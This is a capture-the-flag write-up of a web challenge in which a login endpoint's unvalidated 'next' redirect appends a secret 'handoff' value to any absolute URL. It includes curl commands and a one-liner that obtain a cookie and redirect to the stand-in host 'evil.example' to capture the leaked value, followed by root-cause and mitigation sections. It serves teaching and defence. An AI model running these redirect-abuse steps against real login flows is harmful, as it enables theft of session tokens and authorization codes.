# web2 — The Trusting Login Desk (open redirect → token leak)

> *The login desk is happy to send buyers back where they came from. If the
> return address is trusted too much, something extra may tag along.*

**Category:** Web — open redirect with secret tagging
**Flag:** `bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}`

## The brief, in plain English

A login flow that accepts a "where to send the user after login" parameter and
trusts it blindly. The "something extra" hanging off the end is the punchline:
the server attaches a sensitive value to the redirect, intending it to land at
a trusted same-origin page, and an attacker who controls the return address
ends up with that value in their request log.

This is the canonical OAuth `redirect_uri` confused-deputy bug, dramatised.

## Recon

The site has an `/auth` page and not much else visible. Inspecting its JS
bundle (`/_next/static/chunks/app/auth/page-9ddd8f18489117b9.js`) is the
discovery oracle — the server-rendered HTML of `/auth` doesn't mention `next`
anywhere, but the client code does:

```js
let e = new URLSearchParams(window.location.search).get("next");
if (e) {
  window.location.href = "/api/auth/complete?next=" + encodeURIComponent(e);
  return;
}
window.location.href = "/dashboard";
```

So after a successful login the SPA either jumps to `/dashboard` or, if the
URL had `?next=<something>`, hands the value off to
`GET /api/auth/complete?next=<URL-encoded>`. That handler is the interesting
one.

A few quick probes draw out its behaviour:

| Request | Result |
|---|---|
| `GET /api/auth/complete` (no cookie) | 307 → `/auth` |
| `GET /api/auth/complete?next=/admin` (with cookie) | 500 |
| `GET /api/auth/complete?next=/flag` (with cookie) | 500 |
| `GET /api/auth/complete?next=https://example.com/` (with cookie) | 307 → `https://example.com/?handoff=…` |

Two things fall out of this:

1. **Authentication is trivial.** `POST /api/auth/login` accepts any
   email/password pair and issues an HS256 JWT in an `auth-token` cookie.
   That's intentional for the CTF — it just removes the noise of "do I have
   credentials".
2. **The handler does *something extra* with the URL.** Relative paths return
   500, absolute URLs work. That smells like the server is calling a
   URL-parsing routine (probably `new URL(next)`) so it can append a query
   parameter before redirecting. The 500 is the breadcrumb — it tells the
   solver the redirect handler isn't a plain forwarder.

The "something extra" is the `?handoff=<flag>` that the server tacks onto the
absolute URL before issuing the 307.

## Exploitation

```bash
# 1. Get the (trivial) JWT cookie
COOKIE=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' \
  http://159.89.230.27/api/auth/login -D - \
  | awk -F'[=;]' '/auth-token/{print "auth-token="$2}')

# 2. Hand the redirect handler a URL you "control" and read the Location header
curl -sik -b "$COOKIE" \
  "http://159.89.230.27/api/auth/complete?next=https://evil.example/" \
  | sed -n 's/^location: //ip'
```

Output:

```
https://evil.example/?handoff=bitflag%7Btru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts%7D
```

URL-decode the `handoff` parameter and you've got the flag.

In the real-world version of this bug, `handoff` would be a session token,
OAuth authorization code, or one-time SSO ticket — a value the server fully
intends to send to the "next page" because in a sane world the next page is
the same application and the value lets it pick up the user's session. The
moment the server fails to validate that "next" is one of its own pages, an
attacker walks off with a credential.

## Root cause

Three failures stacked:

1. **No allow-list on `next`.** The handler accepts arbitrary absolute URLs.
   A list of permitted hosts (or just "must match `request.host`") closes
   this entire class.
2. **Sensitive value transported via URL.** Anything that lands in a query
   string ends up in browser history, server logs, referer headers on
   outgoing requests, and TLS-terminating-proxy logs. URLs are not a
   confidentiality boundary.
3. **The 500 on relative paths is a giveaway.** The server is willing to tell
   the attacker which inputs it can't parse — useful both for the CTF and
   for any real-world reconnaissance.

## Mitigation

- **Allow-list `next` against the same host** (or a short list of trusted
  hosts). Reject anything that doesn't match.
- **Don't put secrets in query parameters.** If a value needs to cross from
  the auth server to a relying party, deliver it through a server-to-server
  exchange (authorization-code grant), or at minimum a POST with the secret
  in the body.
- **Never blindly construct URLs from user-supplied path fragments without
  first parsing them with a strict `URL` constructor and checking the
  resulting `origin`/`host`** — a check you do *before* deciding whether to
  honour the redirect, not as part of the redirect itself.

## Takeaways

- The hint maps cleanly to each control: "login desk" = `/auth`, "send buyers
  back where they came from" = `next=`, "return address trusted too much" = no
  allow-list, "something extra may tag along" = the `?handoff=<flag>`.
- Read the **JS bundle**, not just the SSR HTML. The parameter name and the
  handler URL are both only visible in the minified Next.js chunk.
- **Pair with web1.** Web1 leaks via a polite-request control (`robots.txt`);
  web2 leaks via a polite-return-address. Same root cause class: trusting a
  client-supplied piece of metadata to enforce a server-side boundary.

## One-liner

```bash
curl -sik -b "auth-token=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' http://<host>/api/auth/login -D - \
  | awk -F'[=;]' '/auth-token/{print $2}')" \
  "http://<host>/api/auth/complete?next=https://evil.example/" \
  | sed -n 's/^location: //ip'
```
